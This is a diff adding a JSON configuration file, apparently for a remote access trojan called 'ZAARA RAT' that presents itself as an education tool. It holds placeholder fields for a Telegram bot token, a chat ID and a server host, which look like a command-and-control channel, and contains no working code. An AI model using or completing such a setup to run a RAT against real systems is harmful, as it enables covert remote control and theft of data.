@@ -1,0 +1,14 @@
+{
+    "token": "your_telegram_bot_token_here",
+    "id": "your_telegram_chat_id_here",
+    "host": "https://your-server-url.com/",
+    "author": "ZAARA",
+    "version": "2.0.0",
+    "project": "ZAARA RAT - Advanced Cybersecurity Education Tool",
+    "features": {
+        "encryption": true,
+        "logging": true,
+        "rateLimiting": true,
+        "sessionManagement": true
+    }
+}
